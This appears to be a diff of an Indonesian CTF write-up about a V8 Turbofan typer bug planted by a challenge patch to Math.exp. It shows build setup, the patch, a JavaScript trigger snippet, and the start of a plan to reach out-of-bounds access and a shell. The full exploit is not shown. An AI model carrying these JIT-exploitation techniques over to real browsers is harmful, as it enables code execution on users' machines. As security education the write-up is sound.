@@ -1,835 +1,11 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>Cyber Jawara Quick Maffs | Linz’s Blog</title>
-<meta name="generator" content="Jekyll v4.2.1">
-<meta property="og:title" content="Cyber Jawara Quick Maffs">
-<meta name="author" content="linz04">
-<meta property="og:locale" content="id">
-<meta name="description" content="Introduction 1 + 1 = 2, e^2 that’s 9? maybe? idk. Author: circleous#0587">
-<meta property="og:description" content="Introduction 1 + 1 = 2, e^2 that’s 9? maybe? idk. Author: circleous#0587">
-<link rel="canonical" href="http://localhost:4000/ctf/2021/11/29/quickmaffs.html">
-<meta property="og:url" content="http://localhost:4000/ctf/2021/11/29/quickmaffs.html">
-<meta property="og:site_name" content="Linz’s Blog">
-<meta property="og:type" content="article">
-<meta property="article:published_time" content="2021-11-29T00:00:00+07:00">
-<meta name="twitter:card" content="summary">
-<meta property="twitter:title" content="Cyber Jawara Quick Maffs">
-<script type="application/ld+json">
-{"@type":"BlogPosting","url":"http://localhost:4000/ctf/2021/11/29/quickmaffs.html","author":{"@type":"Person","name":"linz04"},"headline":"Cyber Jawara Quick Maffs","dateModified":"2021-11-29T00:00:00+07:00","datePublished":"2021-11-29T00:00:00+07:00","description":"Introduction 1 + 1 = 2, e^2 that’s 9? maybe? idk. Author: circleous#0587","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2021/11/29/quickmaffs.html"},"@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="shortcut icon" href="">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
-  <link rel="stylesheet" href="/assets/css/main.css">
-  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Linz's Blog">
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
-<!-- and it's easy to individually load additional languages -->
-<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script>
-// Init highlight js
-document.addEventListener('DOMContentLoaded', function(event) {
-  var els = document.querySelectorAll('pre code')
-
-  function addLangData(block) {
-    var outer = block.parentElement.parentElement.parentElement;
-    var lang = block.getAttribute('data-lang');
-    for (var i = 0; i < outer.classList.length; i++) {
-      var cls = outer.classList[i];
-      if (cls.startsWith('language-')) {
-        lang = cls;
-        break;
-      }
-    }
-    if (!lang) {
-      cls = block.getAttribute('class');
-      lang = cls ? cls.replace('hljs ', '') : '';
-    }
-    if (lang.startsWith('language-')) {
-      lang = lang.substr(9);
-    }
-    block.setAttribute('class', 'hljs ' + lang);
-    block.parentNode.setAttribute('data-lang', lang);
-  }
-
-  function addBadge(block) {
-    var enabled = ('true' || 'true').toLowerCase();
-    if (enabled == 'true') {
-      var pre = block.parentElement;
-      pre.classList.add('badge');
-    }
-  }
-
-  function handle(block) {
-    addLangData(block);
-    addBadge(block)
-    hljs.highlightBlock(block);
-  }
-
-  for (var i = 0; i < els.length; i++) {
-    var el = els[i];
-    handle(el);
-  }
-});
-</script>
-
-<style>
-  /* code language badge */
-  pre.badge::before {
-    content: attr(data-lang);
-    color: #fff;
-    background-color: #ff4e00;
-    padding: 0 .5em;
-    border-radius: 0 2px;
-    text-transform: uppercase;
-    text-align: center;
-    min-width: 32px;
-    display: inline-block;
-    position: absolute;
-    right: 0;
-  }
-
-  /* fix wrong badge display for firefox browser */
-  code > table pre::before {
-    display: none;
-  }
-</style>
-</head>
-<body>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<header class="site-header " role="banner">
-
-  <div class="wrapper">
-    <div class="site-header-inner">
-<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
-  <img class="site-favicon" title="Linz's Blog" src="" onerror="this.style.display='none'">
-  Linz's Blog
-</a>
-</span><nav class="site-nav">
-          <input type="checkbox" id="nav-trigger" class="nav-trigger">
-          <label for="nav-trigger">
-            <span class="menu-icon">
-              <svg viewbox="0 0 18 15" width="18px" height="15px">
-                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
-              </svg>
-            </span>
-          </label>
-
-          <div class="trigger">
-<a class="page-link" href="/about.html">ABOUT</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
-
-
-
-
-
-
-
-
-
-<span class="page-link">
-
-
-
-<div id="google_translate_element" style="display: none;">
-</div>
-
-<span class="ct-language">
-  <ul class="list-unstyled ct-language-dropdown">
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="id">
-          
-          <img src="https://cdn.countryflags.com/thumbs/indonesia/flag-400.png" title="Indonesia">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="en">
-          
-          <img src="https://cdn.countryflags.com/thumbs/united-states-of-america/flag-400.png" title="English">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="fr">
-          
-          <img src="https://cdn.countryflags.com/thumbs/france/flag-400.png" title="French">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="zh-CN">
-          
-          <img src="https://cdn.countryflags.com/thumbs/china/flag-400.png" title="Chinese(Simple)">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ja">
-          
-          <img src="https://cdn.countryflags.com/thumbs/japan/flag-400.png" title="Japanese">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ko">
-          
-          <img src="https://cdn.countryflags.com/thumbs/south-korea/flag-400.png" title="Korean">
-          
-        </a>
-      </li>
-    
-      <li>
-        <a href="#" class="lang-select" data-lang="ru">
-          
-          <img src="https://cdn.countryflags.com/thumbs/russia/flag-400.png" title="Russian">
-          
-        </a>
-      </li>
-    
-  </ul>
-</span>
-
-<script type="text/javascript">
-function googleTranslateElementInit() {
-  new google.translate.TranslateElement({
-    pageLanguage: 'id',
-    autoDisplay: false,
-    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
-  }, 'google_translate_element');
-
-  // Links to cross-origin destinations are unsafe
-  var gll = document.getElementsByClassName('goog-logo-link')[0];
-  if (gll) {
-    gll.setAttribute('rel', 'noopener');
-  }
-
-  function restoreLang() {
-    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
-    if (!iframe) return;
-
-    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
-    var restore_el = innerDoc.getElementsByTagName("button");
-
-    for (var i = 0; i < restore_el.length; i++) {
-      if (restore_el[i].id.indexOf("restore") >= 0) {
-        restore_el[i].click();
-        var close_el = innerDoc.getElementsByClassName("goog-close-link");
-        close_el[0].click();
-        return;
-      }
-    }
-  }
-
-  function triggerHtmlEvent(element, eventName) {
-    var event;
-    if (document.createEvent) {
-      event = document.createEvent('HTMLEvents');
-      event.initEvent(eventName, true, true);
-      element.dispatchEvent(event);
-    } else {
-      event = document.createEventObject();
-      event.eventType = eventName;
-      element.fireEvent('on' + event.eventType, event);
-    }
-  }
-
-  var googleCombo = document.querySelector("select.goog-te-combo");
-  var langSelect = document.querySelector('.ct-language');
-  langSelect.addEventListener('click', function(event) {
-    if (!event.target) {
-      return;
-    }
-
-    var selected = document.querySelector('.ct-language .ct-language-selected');
-    if (selected) {
-      selected.classList.remove('ct-language-selected');
-    }
-
-    var target = event.target;
-    while (target && target !== langSelect ) {
-      if (target.matches('.lang-select')) {
-        break;
-      }
-      target = target.parentElement;
-    }
-
-    if (target && target.matches('.lang-select')) {
-      var lang = target.getAttribute('data-lang');
-      if (googleCombo.value == lang) {
-        restoreLang();
-      } else {
-        target.parentElement.classList.add('ct-language-selected');
-        googleCombo.value = lang;
-        triggerHtmlEvent(googleCombo, 'change');
-      }
-    }
-
-    event.preventDefault();
-  });
-}
-</script>
-
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-</span>
-</div>
-        </nav>
-</div>
-  </div>
-</header>
-
-<script>
-  function initHeader() {
-    var lastScrollY = getScrollPos().y;
-    var documentElement = document.documentElement;
-
-    function storeScrollData() {
-      var y = getScrollPos().y;var scrollStatus = "";
-
-      if (y <= 0) {
-        scrollStatus = "top";
-      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
-        scrollStatus = "bottom";
-      } else {
-        var isScrollDown = (y - lastScrollY > 0) ? true : false;
-        scrollStatus = isScrollDown ? "down" : "up";
-      }
-
-      lastScrollY = y;
-      documentElement.setAttribute("data-scroll-status", scrollStatus);
-    }
-
-    window.addEventListener('scroll', function(e) {
-      storeScrollData();
-    });
-
-    storeScrollData();
-  }
-  document.addEventListener('DOMContentLoaded', initHeader);
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script>
-  function hashLocate(hashValue) {
-    hashValue = hashValue.replace(/^.*#h-/, '');
-    hashValue = decodeURIComponent(hashValue);
-    var element = document.getElementById(hashValue);
-
-    if (!element) {
-      return;
-    }
-
-    var header = document.querySelector('header.site-header');
-    var headerRect = header.getBoundingClientRect();
-    var headerTop = Math.floor(headerRect.top);
-    var headerHeight = Math.floor(headerRect.height);
-    var scrollPos = getScrollPos();
-    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
-
-    if (offsetY == scrollPos.y) {
-      return;
-    }
-
-    if (headerTop == 0  && offsetY > scrollPos.y) {
-      offsetY += headerHeight + 2;
-    } else if (headerTop < 0  && offsetY < scrollPos.y) {
-      offsetY -= headerHeight - 2;
-    }
-
-    smoothScrollTo(offsetY);
-  }
-
-  // The first event occurred
-  window.addEventListener('load', function(event) {
-    if (window.location.hash) {
-      hashLocate(window.location.hash);
-    }
-  });
-
-  // The first event occurred
-  window.addEventListener('click', function(event) {
-    if (event.target.tagName.toLowerCase() == 'a') {
-      hashLocate(event.target.getAttribute('href'));
-    }
-  });
-</script>
-<div class="theme-toggle">
-  <input type="checkbox" id="theme-switch">
-  <label for="theme-switch">
-    <div class="toggle"></div>
-    <div class="names">
-      <p class="light">Light</p>
-      <p class="dark">Dark</p>
-    </div>
-  </label>
-</div>
-
-
-
-
-<script>
-  (function() {
-    var sw = document.getElementById('theme-switch');
-    var html = document.getElementsByTagName('html')[0];
-    var nightModeOption = ('auto' || 'auto').toLowerCase();
-    var storage = nightModeOption === 'manual'
-        ? localStorage
-        : sessionStorage;
-    var themeData = loadThemeData();
-
-    function saveThemeData(data) {
-      storage.setItem('theme', JSON.stringify(data));
-    }
-
-    function loadThemeData() {
-      var data = storage.getItem('theme');
-      try {
-        data = JSON.parse(data ? data : '');
-      } catch(e) {
-        data = { nightShift: undefined, autoToggleAt: 0 };
-        saveThemeData(data);
-      }
-      return data;
-    }
-
-    function handleThemeToggle(nightShift) {
-      themeData.nightShift = nightShift;
-      saveThemeData(themeData);
-      html.dataset.theme = nightShift ? 'dark' : 'light';
-      setTimeout(function() {
-        sw.checked = nightShift ? true : false;
-      }, 50);
-    }
-
-    function autoThemeToggle() {
-      // Next time point of theme toggle
-      var now = new Date();
-      var toggleAt = new Date();
-      var hours = now.getHours();
-      var nightShift = hours >= 19 || hours <=7;
-
-      if (nightShift) {
-        if (hours > 7) {
-          toggleAt.setDate(toggleAt.getDate() + 1);
-        }
-        toggleAt.setHours(7);
-      } else {
-        toggleAt.setHours(19);
-      }
-
-      toggleAt.setMinutes(0);
-      toggleAt.setSeconds(0);
-      toggleAt.setMilliseconds(0)
-
-      var delay = toggleAt.getTime() - now.getTime();
-
-      // auto toggle theme mode
-      setTimeout(function() {
-        handleThemeToggle(!nightShift);
-      }, delay);
-
-      return {
-        nightShift: nightShift,
-        toggleAt: toggleAt.getTime()
-      };
-    }
-
-    // Listen the theme toggle event
-    sw.addEventListener('change', function(event) {
-      handleThemeToggle(event.target.checked);
-    });
-
-    if (nightModeOption == 'auto') {
-      var data = autoThemeToggle();
-
-      // Toggle theme by local setting
-      if (data.toggleAt > themeData.autoToggleAt) {
-        themeData.autoToggleAt = data.toggleAt;
-        handleThemeToggle(data.nightShift);
-      } else {
-        handleThemeToggle(themeData.nightShift);
-      }
-    } else if (nightModeOption == 'manual') {
-      handleThemeToggle(themeData.nightShift);
-    } else {
-      var nightShift = themeData.nightShift;
-      if (nightShift === undefined) {
-        nightShift = nightModeOption === 'on';
-      }
-      handleThemeToggle(nightShift);
-    }
-  })();
-</script>
-<main class="page-content" aria-label="Content">
-      <div class="wrapper">
-        <div class="framework">
-  <section class="main">
-
-     <div class="post">
-  <section>
-
-
-
-
-
-
-
-
-
-<header class="post-header">
-  <h1 class="post-title p-name" itemprop="name headline">Cyber Jawara Quick Maffs</h1>
-  <h2 class="post-subtitle">Typer Bug v8</h2>
-
-  <p class="post-meta">
-    <time class="dt-published" datetime="2021-11-29T00:00:00+07:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Nov 29, 2021
-    </time>
-
-    
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 2 hours 5 mins</span>
-  </p>
-<div class="post-tags">
-<a class="post-tag" href="/tags.html#national">#national</a><a class="post-tag" href="/tags.html#writeups">#writeups</a><a class="post-tag" href="/tags.html#v8">#v8</a>
-</div></header>
-<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-
-    <div class="post-content e-content" itemprop="articleBody">
-
-      <h2 id="introduction">Introduction</h2>
+I"q@<h2 id="introduction">Introduction</h2>
 <blockquote>
-  <p>1 + 1 = 2, e^2 that’s 9? maybe? idk.<br>
+  <p>1 + 1 = 2, e^2 that’s 9? maybe? idk.<br />
 Author: circleous#0587</p>
 </blockquote>
 
-<p>Untuk download challengenya kalian bisa download di <a href="https://google.com">sini</a><br>
-Untuk referensi v8 typer bug kalian bisa lihat di <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">sini</a>.<br>
+<p>Untuk download challengenya kalian bisa download di <a href="https://google.com">sini</a><br />
+Untuk referensi v8 typer bug kalian bisa lihat di <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">sini</a>.<br />
 Hint dari author:</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">is</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="kc">NaN</span><span class="p">),</span> <span class="kc">NaN</span><span class="p">);</span>
@@ -840,15 +16,13 @@ Hint dari author:</p>
 <p>Didalam zip file sudah ada README.md bisa kalian baca, tapi disini saya akan jelaskan cara setup dan build untuk challengenya dari awal.</p>
 <ol>
   <li>Install depot_tools
-    <div class="language-sh highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
   <span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"export PATH=/home/your_path/path/depot_tools:</span><span class="nv">$PATH</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> ~/.bashrc
   <span class="nv">$ </span><span class="nb">source</span> ~/.bashrc
 </code></pre></div>    </div>
   </li>
   <li>Next extract challengenya, dan dialamnya sudah ada README.md
-    <div class="language-sh highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>fetch v8 <span class="c"># https://chromium.googlesource.com/chromium/tools/depot_tools.git</span>
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>fetch v8 <span class="c"># https://chromium.googlesource.com/chromium/tools/depot_tools.git</span>
   <span class="nv">$ </span><span class="nb">cd </span>v8
   <span class="nv">$ </span>./build/install-build-deps.sh
   <span class="nv">$ </span>git checkout 5fe0aa3bc79c0a9d3ad546b79211f07105f09585
@@ -873,16 +47,15 @@ Untuk Debugging bisa menggunakan gdb</p>
 <span class="p">}</span>
 <span class="nx">foo</span><span class="p">();</span>
 </code></pre></div></div>
-<p><img src="/assets/images/quickmaffs/quick1.png" alt="Test"></p>
+<p><img src="/assets/images/quickmaffs/quick1.png" alt="Test" /></p>
 
 <p><strong>Now we are ready to HACK!</strong></p>
 
 <h2 id="patch-analysis">Patch Analysis</h2>
-<p>Sekarang kita baca patch <code class="language-plaintext highlighter-rouge">maffs.patch</code> yang ada di soal untuk yang <code class="language-plaintext highlighter-rouge">v8_global.patch</code> tidak ada yang perlu kita analisis.<br>
+<p>Sekarang kita baca patch <code class="language-plaintext highlighter-rouge">maffs.patch</code> yang ada di soal untuk yang <code class="language-plaintext highlighter-rouge">v8_global.patch</code> tidak ada yang perlu kita analisis.<br />
 Kita fokus ke <code class="language-plaintext highlighter-rouge">maffs.patch</code>.</p>
 
-<figure class="highlight"><pre><code class="language-diff" data-lang="diff"><table class="rouge-table"><tbody><tr>
-<td class="gutter gl"><pre class="lineno">1
+<figure class="highlight"><pre><code class="language-diff" data-lang="diff"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -909,8 +82,7 @@ Kita fokus ke <code class="language-plaintext highlighter-rouge">maffs.patch</co
 25
 26
 27
-</pre></td>
-<td class="code"><pre><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
+</pre></td><td class="code"><pre><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
 index 50a523c606..0b46267c4f 100644
 </span><span class="gd">--- a/src/compiler/js-create-lowering.cc
 </span><span class="gi">+++ b/src/compiler/js-create-lowering.cc
@@ -937,8 +109,7 @@ index e7dc51bd2d..121a7a7107 100644
 </span> }
  
  Type OperationTyper::NumberExpm1(Type type) {
-</pre></td>
-</tr></tbody></table></code></pre></figure>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Disini saya jelasin sedikit maksud patch diatas:</p>
 <ul>
@@ -946,25 +117,25 @@ index e7dc51bd2d..121a7a7107 100644
   <li>Line selanjutnya patching file <code class="language-plaintext highlighter-rouge">src/compiler/operation-typer.cc</code> untuk code yang di patch bisa dilihat pada line 23 dan 24.</li>
 </ul>
 
-<p>Can u guys see the bug?<br>
-Sebelum patch typer set<br>
-<code class="language-plaintext highlighter-rouge">Math.exp to be Union(Type::PlainNumber(), Type::NaN(), zone())</code> ini berarti output dari Math.exp adalah PlainNumber atau NaN.<br>
+<p>Can u guys see the bug?<br />
+Sebelum patch typer set<br />
+<code class="language-plaintext highlighter-rouge">Math.exp to be Union(Type::PlainNumber(), Type::NaN(), zone())</code> ini berarti output dari Math.exp adalah PlainNumber atau NaN.<br />
 Nah setelah patch, kita bisa lihat pada line 24.
-Typer set <code class="language-plaintext highlighter-rouge">Math.exp to be PlainNumber();</code> ini berarti output dari Math.exp akan menjadi PlainNumber.<br>
-Nah dari tadi kita selalu nyebut typer typer, apa sih itu?<br>
-Jadi, Modern JS engine seperti v8 melakukan kompilasi <strong>just-in-time (JIT)</strong> dari kode JS.<br>
+Typer set <code class="language-plaintext highlighter-rouge">Math.exp to be PlainNumber();</code> ini berarti output dari Math.exp akan menjadi PlainNumber.<br />
+Nah dari tadi kita selalu nyebut typer typer, apa sih itu?<br />
+Jadi, Modern JS engine seperti v8 melakukan kompilasi <strong>just-in-time (JIT)</strong> dari kode JS.<br />
 Hal ini dilakukan untuk mempercepat eksekusi dari JS. Nah loh bingung, untuk lengkapnya ada di <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">sini</a>.
-Jadi intinya v8 akan memanggil Turbofan JIT Compiler jika kita melakukan loop dalam jumlah banyak. Lets try<br></p>
+Jadi intinya v8 akan memanggil Turbofan JIT Compiler jika kita melakukan loop dalam jumlah banyak. Lets try<br /></p>
 
 <h2 id="trigger-the-bug">Trigger the Bug</h2>
-<p>Langsung saja dari hint yang diberikan kita coba dulu, seperti ini.<br></p>
+<p>Langsung saja dari hint yang diberikan kita coba dulu, seperti ini.<br /></p>
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">is</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="kc">NaN</span><span class="p">),</span> <span class="kc">NaN</span><span class="p">);</span>
     <span class="k">return</span> <span class="nx">v</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">foo</span><span class="p">());</span> <span class="c1">//true</span>
 </code></pre></div></div>
-<p>Nah karena penjelasan sebelumnya, Turbofan akan terpanggil jika kita melakukan <strong>loop</strong> yang banyak.<br></p>
+<p>Nah karena penjelasan sebelumnya, Turbofan akan terpanggil jika kita melakukan <strong>loop</strong> yang banyak.<br /></p>
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">is</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="kc">NaN</span><span class="p">),</span> <span class="kc">NaN</span><span class="p">);</span>
     <span class="k">return</span> <span class="nx">v</span><span class="p">;</span>
@@ -979,44 +150,43 @@ Jadi intinya v8 akan memanggil Turbofan JIT Compiler jika kita melakukan loop da
 </code></pre></div></div>
 <p>See? kita berhasil trigger bug, kenapa bisa jadi false? karena saat Turbofan melakukan compiler, v8 akan melakukan
 optimasi pipeline. Nah loh bingung, intinya v8 akan menjalankan source code dari <code class="language-plaintext highlighter-rouge">src/compiler/operation-typer.cc</code>
-Ada perubahan pada source code tersebut saat kita melakukan patching tadi.<br></p>
+Ada perubahan pada source code tersebut saat kita melakukan patching tadi.<br /></p>
 <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Type OperationTyper::NumberExp(Type type) {
    DCHECK(type.Is(Type::Number()));
 <span class="gd">-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
 </span><span class="gi">+  return Type::PlainNumber();
 </span> }
 </code></pre></div></div>
-<p>Yang dimana sebelumnya <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> di Turbofan bisa menjadi <strong>PlainNumber</strong> atau <strong>NaN</strong>. <br>
-Setelah patch <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> di Turbofan akan selalu menjadi <strong>PlainNumber</strong>, yang seharusnya result yang benar dari <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> adalah <strong>NaN</strong>.<br>
-Nah gimana caranya kita ingin debug lewat TurboFan? kalian bisa build di local caranya bisa lihat di <a href="https://chromium.googlesource.com/v8/v8/+/refs/heads/lkgr/tools/turbolizer/">sini</a>.<br>
+<p>Yang dimana sebelumnya <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> di Turbofan bisa menjadi <strong>PlainNumber</strong> atau <strong>NaN</strong>. <br />
+Setelah patch <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> di Turbofan akan selalu menjadi <strong>PlainNumber</strong>, yang seharusnya result yang benar dari <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> adalah <strong>NaN</strong>.<br />
+Nah gimana caranya kita ingin debug lewat TurboFan? kalian bisa build di local caranya bisa lihat di <a href="https://chromium.googlesource.com/v8/v8/+/refs/heads/lkgr/tools/turbolizer/">sini</a>.<br />
 Atau cara lain bisa akses online lewat <a href="https://v8.github.io/tools/head/turbolizer/index.html">sini</a>.</p>
 
 <p>Nah next kalian bisa lakukan command <code class="language-plaintext highlighter-rouge">./d8 exploit.js --trace-turbo</code>, nanti akan ada file bernama <code class="language-plaintext highlighter-rouge">turbo-foo-x.json</code>
-<img src="/assets/images/quickmaffs/quick2.png" alt="Quick2"></p>
+<img src="/assets/images/quickmaffs/quick2.png" alt="Quick2" /></p>
 
-<p>Next tinggal buka website <strong>turbolizer</strong> CTRL+L untuk dan pilih file json kalian, jangan lupa baca info yang lain di menu sebelah kiri biar lebih paham.<br>
+<p>Next tinggal buka website <strong>turbolizer</strong> CTRL+L untuk dan pilih file json kalian, jangan lupa baca info yang lain di menu sebelah kiri biar lebih paham.<br />
 Tampilan awal kalian akan seperti ini.
-<img src="/assets/images/quickmaffs/quick4.png" alt="Quick4"></p>
+<img src="/assets/images/quickmaffs/quick4.png" alt="Quick4" /></p>
 
-<p>Nah ikutan dah tuh sesuai tanda panah, sebenernya gak harus milih mode <strong>TFTyper</strong>, tapi untuk debug typer bug pada chall ini saya lebih mudah lihat dengan itu.<br>
-Jangan lupa klik symbol <strong>T</strong> yang diatas, dan aktifkan semua node yang putih2.<br>
-Cara aktifinnya bisa tekan <code class="language-plaintext highlighter-rouge">a</code> ini akan select semua nodes, selanjutnya tinggal tekan <code class="language-plaintext highlighter-rouge">shift+1-9</code>.<br>
-Lalu tekan <code class="language-plaintext highlighter-rouge">r</code> untuk reload biar tampilannya jadi lebih kece anjay XD. Kurang lebih seperti ini nanti.<br>
-<img src="/assets/images/quickmaffs/quick5.png" alt="Quick5"></p>
+<p>Nah ikutan dah tuh sesuai tanda panah, sebenernya gak harus milih mode <strong>TFTyper</strong>, tapi untuk debug typer bug pada chall ini saya lebih mudah lihat dengan itu.<br />
+Jangan lupa klik symbol <strong>T</strong> yang diatas, dan aktifkan semua node yang putih2.<br />
+Cara aktifinnya bisa tekan <code class="language-plaintext highlighter-rouge">a</code> ini akan select semua nodes, selanjutnya tinggal tekan <code class="language-plaintext highlighter-rouge">shift+1-9</code>.<br />
+Lalu tekan <code class="language-plaintext highlighter-rouge">r</code> untuk reload biar tampilannya jadi lebih kece anjay XD. Kurang lebih seperti ini nanti.<br />
+<img src="/assets/images/quickmaffs/quick5.png" alt="Quick5" /></p>
 
 <p>Kita bisa lihat terdapat node <strong>NumberExp</strong> disitu dan resultnya adalah <strong>PlainNumber</strong> yang seharusnya result aslinya adalah <strong>NaN</strong>.
 Selanjutnya, bagaimana kita manfaatkan bug ini hingga bisa dapat shell?.</p>
 
 <h3 id="proceed-the-bug">Proceed the Bug</h3>
 
-<p>Sebenarnya banyak writeup tentang v8 typer bug yang bisa kalian cari di google.<br>
+<p>Sebenarnya banyak writeup tentang v8 typer bug yang bisa kalian cari di google.<br />
 Salah satunya <a href="https://www.n1net4il.kr/posts/cve-2020-6383-analysis">CVE-2020-6383</a>. Dari semua writeup typer bug yang ada, goals nya adalah memanfaatkan typer bug ini
-agar bisa mentrigger <strong>OOB</strong>.<br>
-Writeup diatas sedikit mirip dengan chall ini, jadi intinya kita memanfaatkan typer bug untuk membuat nilai di Turbolizer dengan nilai sesungguhnya berbeda agar bisa mentrigger <strong>OOB</strong>.<br>
+agar bisa mentrigger <strong>OOB</strong>.<br />
